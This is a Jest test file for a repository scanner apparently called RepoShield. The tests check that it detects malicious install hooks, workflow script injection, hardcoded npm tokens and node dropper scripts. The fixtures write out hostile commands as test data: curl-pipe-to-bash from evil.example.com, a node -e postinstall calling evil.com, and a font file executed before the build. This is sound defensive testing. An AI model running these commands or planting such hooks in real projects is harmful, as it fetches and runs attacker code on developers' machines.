/**
 * RepoShield — Config Analyzer Tests
 */

import {
  analyzePackageJson,
  analyzeWorkflow,
  analyzeNpmrc,
  analyzeShellScript,
} from '../src/config-analyzer';

import path from 'path';
import fs from 'fs';

const FIXTURE_DIR = path.join(__dirname, '..', 'fixtures');

// ─── Package.json Tests ───────────────────────────────────────────────────────

describe('Config Analyzer — package.json', () => {
  test('detects curl-pipe-to-shell in preinstall script', () => {
    const pkg = JSON.stringify({
      name: 'test',
      version: '1.0.0',
      scripts: {
        preinstall: 'curl http://evil.example.com/install.sh | bash',
      },
    });
    const { findings } = analyzePackageJson('/test/package.json', pkg);
    expect(findings.some((f) => f.ruleId === 'RS-CFG-001')).toBe(true);
    expect(findings[0]?.severity).toBe('critical');
  });

  test('detects node -e inline execution in postinstall', () => {
    const pkg = JSON.stringify({
      name: 'test',
      scripts: { postinstall: "node -e \"require('http').get('http://evil.com')\"" },
    });
    const { findings } = analyzePackageJson('/test/package.json', pkg);
    expect(findings.some((f) => f.ruleId === 'RS-CFG-006')).toBe(true);
  });

  test('detects path traversal in main field', () => {
    const pkg = JSON.stringify({ name: 'test', main: '../../etc/passwd' });
    const { findings } = analyzePackageJson('/test/package.json', pkg);
    expect(findings.some((f) => f.ruleId === 'RS-PKG-001')).toBe(true);
  });

  test('normal scripts do not produce false positives', () => {
    const pkg = JSON.stringify({
      name: 'my-app',
      scripts: {
        start: 'node server.js',
        test: 'jest',
        build: 'tsc',
        lint: 'eslint src',
      },
    });
    const { findings } = analyzePackageJson('/test/package.json', pkg);
    expect(findings.filter((f) => f.severity === 'critical' || f.severity === 'high').length).toBe(0);
  });

  test('fixture: malicious-package.fixture.json is detected', () => {
    const fixturePath = path.join(FIXTURE_DIR, 'malicious', 'malicious-package.fixture.json');
    const content = fs.readFileSync(fixturePath, 'utf-8');
    const { findings } = analyzePackageJson(fixturePath, content);
    expect(findings.some((f) => f.severity === 'critical')).toBe(true);
  });
});

// ─── GitHub Actions Workflow Tests ────────────────────────────────────────────

describe('Config Analyzer — GitHub Actions', () => {
  test('detects script injection via github.event.* (RS-WF-001)', () => {
    const workflow = `
name: Test
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - run: echo "\${{ github.event.pull_request.title }}"
`;
    const findings = analyzeWorkflow('/test/.github/workflows/test.yml', workflow);
    expect(findings.some((f) => f.ruleId === 'RS-WF-001')).toBe(true);
    expect(findings[0]?.severity).toBe('critical');
  });

  test('detects pull_request_target usage (RS-WF-003)', () => {
    const workflow = `
on: pull_request_target
`;
    const findings = analyzeWorkflow('/test/.github/workflows/test.yml', workflow);
    expect(findings.some((f) => f.ruleId === 'RS-WF-003')).toBe(true);
  });

  test('detects write-all permissions (RS-WF-004)', () => {
    const workflow = `
permissions: write-all
`;
    const findings = analyzeWorkflow('/test/.github/workflows/test.yml', workflow);
    expect(findings.some((f) => f.ruleId === 'RS-WF-004')).toBe(true);
  });

  test('clean workflow does not produce false positives', () => {
    const workflow = `
name: CI
on: [push, pull_request]
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
      - run: npm ci
      - run: npm test
`;
    const findings = analyzeWorkflow('/test/.github/workflows/ci.yml', workflow);
    const criticalHighFindings = findings.filter(
      (f) => f.severity === 'critical' || f.severity === 'high',
    );
    expect(criticalHighFindings.length).toBe(0);
  });
});

// ─── .npmrc Tests ─────────────────────────────────────────────────────────────

describe('Config Analyzer — .npmrc', () => {
  test('detects hardcoded auth token (RS-NPM-002)', () => {
    const content = '//registry.npmjs.org/:_authToken=abc123secrettoken';
    const findings = analyzeNpmrc('/test/.npmrc', content);
    expect(findings.some((f) => f.ruleId === 'RS-NPM-002')).toBe(true);
    expect(findings[0]?.severity).toBe('critical');
  });

  test('does not flag env-var based auth token', () => {
    const content = '//registry.npmjs.org/:_authToken=${NPM_TOKEN}';
    const findings = analyzeNpmrc('/test/.npmrc', content);
    expect(findings.filter((f) => f.ruleId === 'RS-NPM-002').length).toBe(0);
  });

  test('detects custom registry (RS-NPM-001)', () => {
    const content = 'registry=https://my-custom-registry.company.internal';
    const findings = analyzeNpmrc('/test/.npmrc', content);
    expect(findings.some((f) => f.ruleId === 'RS-NPM-001')).toBe(true);
  });
});

// ─── Shell Script Tests ───────────────────────────────────────────────────────

describe('Config Analyzer — Shell Scripts', () => {
  test('detects curl-pipe-to-shell (RS-SH-001)', () => {
    const script = `#!/bin/bash
curl https://evil.example.com/install.sh | bash
`;
    const findings = analyzeShellScript('/test/install.sh', script);
    expect(findings.some((f) => f.ruleId === 'RS-SH-001')).toBe(true);
    expect(findings[0]?.severity).toBe('critical');
  });

  test('does not flag comments containing curl-pipe patterns', () => {
    const script = `#!/bin/bash
# Example (do NOT run): curl https://example.com | bash
echo "Clean script"
`;
    const findings = analyzeShellScript('/test/safe.sh', script);
    // The pattern is only in a comment
    expect(findings.filter((f) => f.ruleId === 'RS-SH-001').length).toBe(0);
  });
});

describe('Config Analyzer — prepended node droppers', () => {
  test('flags node init / api.js / app.js on dev, build, and start', () => {
    const pkg = JSON.stringify({
      name: 'spiralink-frontend',
      scripts: {
        dev: 'node init && next dev --turbopack',
        build: 'node init && next build',
        start: 'node init && next start',
        lint: 'next lint',
      },
    });
    const { findings } = analyzePackageJson('/repo/package.json', pkg);
    const hooks = findings.filter((f) => f.ruleId === 'RS-CFG-009');
    expect(hooks).toHaveLength(3);
    expect(hooks.every((f) => f.severity === 'critical')).toBe(true);
    expect(hooks.map((f) => f.message).join(' ')).toContain('dev');
    expect(hooks.map((f) => f.message).join(' ')).toContain('build');
    expect(hooks.map((f) => f.message).join(' ')).toContain('start');
  });

  test('flags api.js and app.js when they are chained ahead of the real tool', () => {
    const pkg = JSON.stringify({
      scripts: {
        dev: 'node api.js && next dev',
        build: 'node ./app.js && next build',
      },
    });
    const { findings } = analyzePackageJson('/repo/package.json', pkg);
    expect(findings.filter((f) => f.ruleId === 'RS-CFG-009')).toHaveLength(2);
  });

  test('flags a font file executed from any directory', () => {
    const pkg = JSON.stringify({
      scripts: {
        dev: 'node lib/vendor/fa-brand-400.woff && next dev',
      },
    });
    const { findings } = analyzePackageJson('/repo/package.json', pkg);
    expect(findings.some((f) => f.ruleId === 'RS-CFG-009' && f.severity === 'critical')).toBe(true);
  });

  test('flags an oversized package script as suspicious', () => {
    const pkg = JSON.stringify({
      scripts: {
        dev: `node -e "${'a'.repeat(520)}" && next dev`,
      },
    });
    const { findings } = analyzePackageJson('/repo/package.json', pkg);
    const sized = findings.filter((f) => f.ruleId === 'RS-DROP-002');
    expect(sized).toHaveLength(1);
    expect(sized[0]?.severity).toBe('high');
  });
});
